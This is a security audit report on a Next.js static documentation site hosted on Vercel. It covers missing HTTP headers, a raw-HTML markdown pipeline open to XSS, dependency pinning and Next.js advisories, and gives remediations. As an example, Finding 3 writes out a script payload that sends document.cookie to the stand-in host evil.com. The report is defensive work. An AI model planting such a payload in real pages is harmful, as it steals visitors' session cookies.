# Security Audit Report — learn-claude-code Web Application

| Field | Value |
|---|---|
| **Date** | 2026-03-19 |
| **Auditor Role** | Senior Web Application Security Auditor (AppSec Lead) |
| **Scope** | Next.js static export web application, Vercel deployment configuration, dependency supply chain |
| **Methodology** | Manual source code review, static analysis, dependency audit, header analysis |
| **Target** | `learn.shareai.run` (Next.js 16.1.6, static export on Vercel) |

This is a Next.js 16.1.6 static export (`output: "export"`) deployed on Vercel. No server runtime, no API routes, no Server Actions. Content is generated at build time from repo-controlled markdown. Custom domain: learn.shareai.run. Old domain: learn-claude-agents.vercel.app (redirect configured).

---

## Table of Contents

- [Finding 1 — Missing Security Headers in vercel.json](#finding-1--missing-security-headers-in-verceljson)
- [Finding 2 — Open Redirect Analysis in vercel.json](#finding-2--open-redirect-analysis-in-verceljson)
- [Finding 3 — rehype-raw + allowDangerousHtml + dangerouslySetInnerHTML XSS Pipeline](#finding-3--rehype-raw--allowdangeroushtml--dangerouslysetinnerhtml-xss-pipeline)
- [Finding 4 — Inline Script in layout.tsx Blocks Strict CSP](#finding-4--inline-script-in-layouttsx-blocks-strict-csp)
- [Finding 5 — Dependency Pinning Issues](#finding-5--dependency-pinning-issues)
- [Finding 6 — skipLibCheck: true in tsconfig.json](#finding-6--skiplibcheck-true-in-tsconfigjson)
- [Finding 7 — allowJs: true in tsconfig.json](#finding-7--allowjs-true-in-tsconfigjson)
- [Finding 8 — Supply Chain: tsx in prod deps, broad version ranges](#finding-8--supply-chain-tsx-in-prod-deps-broad-version-ranges)
- [Finding 9 — No HSTS/CORP/COEP/COOP Headers](#finding-9--no-hstscorpcoeopcoop-headers)
- [Finding 10 — next 16.1.6 Known Vulnerabilities](#finding-10--next-1616-known-vulnerabilities)
- [Executive Summary](#executive-summary)

---

## Finding 1 — Missing Security Headers in vercel.json

| Field | Value |
|---|---|
| **File** | `web/vercel.json` |
| **Line(s)** | 1–20 (entire file) |
| **Severity** | Medium |
| **CVSS v3.1** | 4.7 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N) |

**Issue**: The `vercel.json` configuration file contains only redirect rules and has NO `headers` block. For static exports (`output: "export"`), `vercel.json` is the **only** mechanism to set HTTP security headers—Vercel does NOT add them by default. The following critical security headers are entirely absent:

- `Content-Security-Policy` (CSP)
- `X-Content-Type-Options`
- `X-Frame-Options`
- `Referrer-Policy`
- `Permissions-Policy`
- `Strict-Transport-Security` (HSTS)
- `Cross-Origin-Opener-Policy` (COOP)
- `Cross-Origin-Embedder-Policy` (COEP)
- `Cross-Origin-Resource-Policy` (CORP)

Without these headers, the application is vulnerable to:
- Clickjacking (no X-Frame-Options / CSP frame-ancestors)
- MIME-type sniffing attacks (no X-Content-Type-Options)
- Information leakage via Referer header (no Referrer-Policy)
- Lack of transport layer security enforcement (no HSTS)
- No cross-origin isolation (no COOP/COEP/CORP)

**Exploit scenario**: An attacker embeds the site in an `<iframe>` on a phishing page to perform clickjacking. Without `X-Frame-Options` or CSP `frame-ancestors`, the browser allows the embedding. While the static nature limits what can be clickjacked, brand reputation and user trust are at risk. Additionally, without `X-Content-Type-Options: nosniff`, a misconfigured or injected resource could be interpreted as a different MIME type.

**Recommendation**: Add a comprehensive `headers` block to `web/vercel.json`. The CSP must use the SHA-256 hash of the inline theme script. Full recommended configuration:

```json
{
  "redirects": [
    {
      "source": "/:path(.*)",
      "has": [
        {
          "type": "host",
          "value": "learn-claude-agents.vercel.app"
        }
      ],
      "destination": "https://learn.shareai.run/:path",
      "permanent": true
    },
    {
      "source": "/",
      "destination": "/en",
      "permanent": false
    }
  ],
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        {
          "key": "Content-Security-Policy",
          "value": "default-src 'self'; script-src 'self' 'sha256-jNBf7AQyUoNbCZtcD2O/B0G5cA+LTkk2IyykV+9S0e8='; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'; upgrade-insecure-requests"
        },
        {
          "key": "X-Content-Type-Options",
          "value": "nosniff"
        },
        {
          "key": "X-Frame-Options",
          "value": "DENY"
        },
        {
          "key": "Referrer-Policy",
          "value": "strict-origin-when-cross-origin"
        },
        {
          "key": "Permissions-Policy",
          "value": "camera=(), microphone=(), geolocation=(), interest-cohort=()"
        },
        {
          "key": "Strict-Transport-Security",
          "value": "max-age=63072000; includeSubDomains; preload"
        },
        {
          "key": "Cross-Origin-Opener-Policy",
          "value": "same-origin"
        },
        {
          "key": "Cross-Origin-Embedder-Policy",
          "value": "require-corp"
        },
        {
          "key": "Cross-Origin-Resource-Policy",
          "value": "same-origin"
        }
      ]
    }
  ]
}
```

---

## Finding 2 — Open Redirect Analysis in vercel.json

| Field | Value |
|---|---|
| **File** | `web/vercel.json` |
| **Line(s)** | 2–12 |
| **Severity** | Info |
| **CVSS v3.1** | 0.0 (N/A) |

**Issue**: The redirect rule uses `/:path(.*)` with a `has` condition matching `host: "learn-claude-agents.vercel.app"`, redirecting to `https://learn.shareai.run/:path`. This pattern was analyzed for open redirect potential.

**Exploit scenario**: This is **NOT** an open redirect vulnerability. The redirect is safe because:
1. The destination domain `learn.shareai.run` is **hardcoded** — an attacker cannot control the target domain.
2. The `has` condition only triggers when the request's `Host` header **exactly matches** `learn-claude-agents.vercel.app`.
3. The `:path` parameter is appended to a fixed domain, not a user-controlled domain. While an attacker could craft a path like `//evil.com`, Vercel's redirect engine normalizes paths and the browser would interpret it as `https://learn.shareai.run//evil.com` (a path on the fixed domain, not a redirect to evil.com).

**Recommendation**: No action required. The redirect configuration is secure. Document the redirect purpose for future maintainers.

---

## Finding 3 — rehype-raw + allowDangerousHtml + dangerouslySetInnerHTML XSS Pipeline

| Field | Value |
|---|---|
| **File** | `web/src/components/docs/doc-renderer.tsx` |
| **Line(s)** | 22, 23, 87 |
| **Severity** | Low |
| **CVSS v3.1** | 3.0 (AV:N/AC:H/PR:H/UI:N/S:C/C:L/I:N/A:N) |

**Issue**: The markdown rendering pipeline constructs a full XSS-capable chain:
1. **Line 22**: `remarkRehype` is configured with `{ allowDangerousHtml: true }`, permitting raw HTML to pass through the remark→rehype transformation.
2. **Line 23**: `rehypeRaw` parses and processes the raw HTML nodes, rendering them as actual HTML elements.
3. **Line 87**: The final rendered HTML is injected into the DOM via `dangerouslySetInnerHTML={{ __html: html }}`.

This pipeline means that any HTML (including `<script>`, `<img onerror>`, `<svg onload>`, etc.) present in the markdown source will be rendered as executable HTML in the browser.

**Exploit scenario**: The data source is `docsData` imported from `@/data/generated/docs.json`, which is generated at **build time** from repository-controlled markdown files in `docs/`. This is NOT user input at runtime — the content is statically embedded in the JavaScript bundle during `next build`.

The realistic attack vector is **supply chain**: a malicious contributor could submit a pull request injecting HTML/JavaScript into a markdown doc (e.g., `<img src=x onerror="document.location='https://evil.com/?c='+document.cookie">`). If the PR is merged without careful review, the malicious content would be built into the static site.

This risk is **mitigated** by:
- Code review processes on the repository
- The content being visible in plain-text markdown files
- No runtime user input reaching this pipeline

**Recommendation**: 
1. Add a rehype sanitization plugin (`rehype-sanitize`) to the pipeline as defense-in-depth:
```typescript
import rehypeSanitize, { defaultSchema } from "rehype-sanitize";

// In the unified pipeline, add after rehypeRaw:
.use(rehypeSanitize, {
  ...defaultSchema,
  attributes: {
    ...defaultSchema.attributes,
    code: [...(defaultSchema.attributes?.code || []), "className"],
    pre: [...(defaultSchema.attributes?.pre || []), "className", "dataLanguage"],
    blockquote: [...(defaultSchema.attributes?.blockquote || []), "className"],
    ol: [...(defaultSchema.attributes?.ol || []), "style"],
  },
})
```
2. Alternatively, if raw HTML in markdown is not needed, remove `allowDangerousHtml: true` and `rehype-raw` entirely.

---

## Finding 4 — Inline Script in layout.tsx Blocks Strict CSP

| Field | Value |
|---|---|
| **File** | `web/src/app/[locale]/layout.tsx` |
| **Line(s)** | 41–48 |
| **Severity** | Medium |
| **CVSS v3.1** | 4.7 (AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N) |

**Issue**: The layout file contains an inline `<script dangerouslySetInnerHTML>` block for theme detection (dark mode). This script executes before React hydration to prevent a flash of incorrect theme. The inline script content (289 characters between the template literal backticks) is:

```javascript
(function() {
  var theme = localStorage.getItem('theme');
  if (theme === 'dark' || (!theme && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
    document.documentElement.classList.add('dark');
  }
})();
```

This inline script prevents the use of a strict CSP policy based on `'strict-dynamic'` + per-request nonces. Since this is a **static export**, per-request nonces cannot be generated (there is no server to inject a unique nonce on each response).

The available CSP options are:
1. `'unsafe-inline'` in `script-src` — **weak**, defeats the purpose of CSP for scripts
2. `'sha256-jNBf7AQyUoNbCZtcD2O/B0G5cA+LTkk2IyykV+9S0e8='` in `script-src` — **better**, allows only this specific script content
3. Externalizing the script to a `.js` file — **best**, allows `'self'` only in `script-src`

**Exploit scenario**: If an attacker finds an HTML injection vector (e.g., via Finding #3's XSS pipeline), a weak CSP (`'unsafe-inline'`) would not prevent inline script execution. Using the SHA-256 hash restricts execution to only the known theme script, but any change to the script content would break the hash and require CSP updates. Externalizing the script removes the inline dependency entirely.

**Recommendation**:
- **Option A (Preferred)**: Externalize the theme script to a static file:
  1. Create `web/public/theme.js` with the script content
  2. Replace the inline script with `<script src="/theme.js" />`
  3. Use `script-src 'self'` in CSP (no hash needed)

- **Option B (Current best)**: Keep the inline script and use the SHA-256 hash in CSP:
  ```text
  script-src 'self' 'sha256-jNBf7AQyUoNbCZtcD2O/B0G5cA+LTkk2IyykV+9S0e8='
  ```
  Note: Any modification to the script content (even whitespace changes) will invalidate the hash and require updating both the script and the CSP header.

---

## Finding 5 — Dependency Pinning Issues

| Field | Value |
|---|---|
| **File** | `requirements.txt` (lines 1–2), `web/package.json` (lines 13–28) |
| **Line(s)** | requirements.txt: 1–2; package.json: 13–28 |
| **Severity** | Medium |
| **CVSS v3.1** | 5.6 (AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L) |

**Issue**: Dependency version specifications use overly permissive ranges that could introduce supply chain risks:

**Python (`requirements.txt`)**:
```text
anthropic>=0.25.0
python-dotenv>=1.0.0
```
The `>=` operator with **no upper bound** allows installation of arbitrary future major versions. A malicious or buggy major version update would be automatically installed. Python does not have a lockfile equivalent to `package-lock.json` by default.

**JavaScript (`web/package.json`)**:
```json
"lucide-react": "^0.564.0"
```
For 0.x packages, semver considers minor versions as potentially breaking (`^0.564.0` allows `0.999.0`). While `^` ranges are standard practice in the Node.js ecosystem and `package-lock.json` provides deterministic builds, the 0.x range is notably wide.

Other `^` ranges in `package.json` (e.g., `^8.0.3`, `^12.34.0`, `^7.0.2`) follow standard semver conventions and are mitigated by `package-lock.json`.

**Exploit scenario**: 
- **Python**: An attacker who compromises the `anthropic` or `python-dotenv` PyPI package could publish a malicious version (e.g., `anthropic==99.0.0`) that would be installed on the next `pip install -r requirements.txt` without a lockfile.
- **JavaScript**: Mitigated by `package-lock.json`, but CI/CD pipelines that run `npm install` without `--frozen-lockfile` or `npm ci` could pull newer versions.

**Recommendation**:
1. **Python**: Pin with upper bounds or use exact versions:
   ```text
   anthropic>=0.25.0,<1.0.0
   python-dotenv>=1.0.0,<2.0.0
   ```
   Or better, use a lockfile tool like `pip-compile` (from `pip-tools`) or `poetry.lock`.

2. **JavaScript**: Ensure CI uses `npm ci` (which respects `package-lock.json` exactly) instead of `npm install`.

3. **lucide-react**: Consider pinning to a specific version or narrower range given the 0.x status:
   ```json
   "lucide-react": "0.564.0"
   ```

---

## Finding 6 — skipLibCheck: true in tsconfig.json

| Field | Value |
|---|---|
| **File** | `web/tsconfig.json` |
| **Line(s)** | 6 |
| **Severity** | Info |
| **CVSS v3.1** | 0.0 (N/A) |

**Issue**: The TypeScript configuration sets `"skipLibCheck": true`, which skips type-checking of declaration files (`.d.ts`) from dependencies. This means type errors or inconsistencies in third-party library type definitions will not be caught during compilation.

**Exploit scenario**: This is a **Next.js default** setting, present in all scaffolded Next.js projects via `create-next-app`. The practical security impact is **negligible** — `skipLibCheck` does not affect runtime behavior, only compile-time type checking of library declarations. It primarily affects developer experience (faster builds) rather than security posture.

**Recommendation**: No action required. This is standard Next.js configuration. If maximum type safety is desired for security-critical applications, set `skipLibCheck: false` and resolve any resulting type errors in dependencies.

---

## Finding 7 — allowJs: true in tsconfig.json

| Field | Value |
|---|---|
| **File** | `web/tsconfig.json` |
| **Line(s)** | 5 |
| **Severity** | Info |
| **CVSS v3.1** | 0.0 (N/A) |

**Issue**: The TypeScript configuration sets `"allowJs": true`, permitting `.js` files to coexist alongside `.ts`/`.tsx` files in the project. JavaScript files do not receive full TypeScript type checking, potentially allowing type-related bugs to slip through.

**Exploit scenario**: This is another **Next.js default** setting. The security impact is **negligible** because:
1. `"strict": true` is also enabled (line 7), which applies strict type checking to TypeScript files.
2. The current codebase appears to use `.ts`/`.tsx` files exclusively — no `.js` source files were observed.
3. Runtime behavior is unaffected by this compile-time setting.

**Recommendation**: No action required. If the project does not need to include any `.js` files, setting `allowJs: false` would ensure all source files go through full TypeScript type checking, but the practical security benefit is minimal.

---

## Finding 8 — Supply Chain: tsx in prod deps, broad version ranges

| Field | Value |
|---|---|
| **File** | `web/package.json` |
| **Line(s)** | 26, 15, 16 |
| **Severity** | Low |
| **CVSS v3.1** | 2.5 (AV:L/AC:H/PR:H/UI:N/S:C/C:N/I:L/A:N) |

**Issue**: Two supply chain concerns in `package.json`:

1. **`tsx` in production dependencies** (line 26): The `tsx` package (a TypeScript execution engine) is listed under `dependencies` instead of `devDependencies`:
   ```json
   "tsx": "^4.21.0"
   ```
   `tsx` is used only by the build script (`scripts/extract-content.ts`) via the `"extract"` npm script. It is a **development tool** that should not be shipped to production. While the static export means `tsx` is not deployed to Vercel (only built assets are), listing it in `dependencies` increases the attack surface during CI/CD builds and means it would be installed in any production `npm install`.

2. **lucide-react 0.x range** (line 16): As noted in Finding #5, `"lucide-react": "^0.564.0"` uses a 0.x version where semver allows breaking changes in minor versions.

3. **framer-motion broad range** (line 15): `"framer-motion": "^12.34.0"` is a wide range for a complex animation library.

**Exploit scenario**: If an attacker compromises the `tsx` npm package and publishes a malicious version, it would be installed during production dependency resolution (since it's in `dependencies`). The malicious code would execute during the build step (`npm run extract`), potentially exfiltrating environment variables, modifying build output, or injecting malicious code into the static site.

**Recommendation**:
1. Move `tsx` to `devDependencies`:
   ```bash
   npm install --save-dev tsx
   ```
   This ensures `tsx` is only installed during development and CI builds, not in production deployments.

2. Consider pinning `lucide-react` to an exact version to avoid unexpected 0.x minor version changes.

---

## Finding 9 — No HSTS/CORP/COEP/COOP Headers

| Field | Value |
|---|---|
| **File** | `web/vercel.json` |
| **Line(s)** | 1–20 (entire file) |
| **Severity** | Medium |
| **CVSS v3.1** | 4.3 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N) |

**Issue**: This finding focuses specifically on the **transport security** and **cross-origin isolation** subset of the missing headers (complementing Finding #1's broader scope):

1. **Strict-Transport-Security (HSTS)**: While Vercel serves all traffic over HTTPS, the custom domain `learn.shareai.run` may **not** automatically receive the `Strict-Transport-Security` header. Without HSTS:
   - Users who type `http://learn.shareai.run` in their browser are vulnerable to SSL stripping attacks during the initial HTTP→HTTPS redirect.
   - The domain is not eligible for HSTS preload list inclusion.

2. **Cross-Origin-Resource-Policy (CORP)**: Without `CORP: same-origin`, the site's resources (JS, CSS, images) can be loaded by any cross-origin page, enabling potential data leakage via side-channel attacks.

3. **Cross-Origin-Embedder-Policy (COEP)**: Without `COEP: require-corp`, the site cannot opt into cross-origin isolation, which is required for high-resolution timers and `SharedArrayBuffer`.

4. **Cross-Origin-Opener-Policy (COOP)**: Without `COOP: same-origin`, the site's window can be referenced by cross-origin pages opened via `window.open()`, potentially enabling cross-origin state leakage.

**Exploit scenario**: On a public network (café, airport), an attacker performs an SSL stripping attack on a user navigating to `http://learn.shareai.run`. Without HSTS, the browser doesn't know to force HTTPS, allowing the attacker to intercept and modify the initial HTTP response. While this is a static documentation site (limiting the value of intercepted data), it sets a poor security baseline.

**Recommendation**: See Finding #1's complete `headers` block for the full solution. Key headers for this finding:

```json
{
  "key": "Strict-Transport-Security",
  "value": "max-age=63072000; includeSubDomains; preload"
},
{
  "key": "Cross-Origin-Opener-Policy",
  "value": "same-origin"
},
{
  "key": "Cross-Origin-Embedder-Policy",
  "value": "require-corp"
},
{
  "key": "Cross-Origin-Resource-Policy",
  "value": "same-origin"
}
```

After deploying the HSTS header, submit the domain to the [HSTS Preload List](https://hstspreload.org/) for maximum protection.

---

## Finding 10 — next 16.1.6 Known Vulnerabilities

| Field | Value |
|---|---|
| **File** | `web/package.json` |
| **Line(s)** | 17 |
| **Severity** | Info |
| **CVSS v3.1** | 0.0 (N/A) |

**Issue**: Next.js version 16.1.6 has three known moderate security advisories. However, **all three require server-side Next.js features that are absent in this static export configuration**:

1. **GHSA-mq59-m269-xvcx** — Server Actions CSRF bypass: Requires Server Actions (`"use server"` directive). This application has `output: "export"` and no Server Actions. **Not applicable.**

2. **GHSA-3x4c-7xq6-9pq8** — `next/image` disk cache growth DoS: Requires the Next.js image optimization server (`next/image` with server-side optimization). Static exports use `unoptimized: true` or no server. **Not applicable.**

3. **GHSA-ggv3-7p47-pfv8** — HTTP request smuggling in rewrites: Requires Next.js server-side rewrites processing. Static exports on Vercel use Vercel's edge infrastructure for routing, not Next.js server middleware. **Not applicable.**

**Exploit scenario**: None of these vulnerabilities are exploitable in the current static export deployment. The attack vectors require server-side Next.js components (Server Actions, image optimization server, request processing middleware) that do not exist when using `output: "export"`.

**Recommendation**: While not currently exploitable, upgrade to `next@16.2.0` (or latest) as a **defense-in-depth** measure. This ensures:
- Protection if the application transitions to server-side rendering in the future
- Reduced noise in security scanning tools
- Compliance with dependency freshness policies

```bash
npm install next@16.2.0
```

---

## Executive Summary

### Risk Matrix

| Severity | Count | Finding(s) |
|---|---|---|
| Critical | 0 | — |
| High | 0 | — |
| Medium | 4 | #1, #4, #5, #9 |
| Low | 2 | #3, #8 |
| Info | 4 | #2, #6, #7, #10 |

### Overall Security Posture

The learn-claude-code web application demonstrates a **fundamentally sound security architecture** by virtue of its static export deployment model. By using Next.js with `output: "export"`, the application eliminates entire categories of server-side vulnerabilities: there are no API routes to exploit, no Server Actions to bypass, no server-side session state to hijack, and no database queries to inject. The attack surface is reduced to that of a static file server, which is the smallest possible attack surface for a web application.

The most impactful finding is the **absence of HTTP security headers** (Findings #1 and #9). For a static export on Vercel, `vercel.json` is the sole mechanism for setting security headers, and the current configuration only defines redirects. Adding a comprehensive `headers` block with CSP (using the SHA-256 hash of the inline theme script), HSTS, X-Frame-Options, and other security headers would significantly improve the application's defensive posture with minimal implementation effort. This is a configuration-only change that requires no code modifications.

The remaining findings are either low-severity (supply chain concerns in dependency management) or informational (standard Next.js defaults, non-exploitable CVEs). The XSS pipeline in `doc-renderer.tsx` (Finding #3) is mitigated by the build-time data source, and the inline script CSP limitation (Finding #4) has a clear remediation path via script externalization or SHA-256 hashing. Overall, this application achieves a **good security posture** for a documentation site, with the header configuration being the primary area for improvement.

### Priority Remediation Roadmap

| Priority | Timeframe | Action | Findings |
|---|---|---|---|
| **P0** | Immediate (1–2 days) | Add comprehensive security headers in `vercel.json` including CSP with `'sha256-jNBf7AQyUoNbCZtcD2O/B0G5cA+LTkk2IyykV+9S0e8='`, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy, COOP, COEP, CORP | #1, #4, #9 |
| **P1** | Short-term (1–2 weeks) | Move `tsx` to `devDependencies`; pin Python dependency upper bounds; ensure CI uses `npm ci` | #5, #8 |
| **P2** | Maintenance (ongoing) | Upgrade Next.js to 16.2.0+; monitor dependency updates; consider adding `rehype-sanitize` for defense-in-depth; optionally externalize theme script to `.js` file | #3, #10 |

---

*End of Security Audit Report*
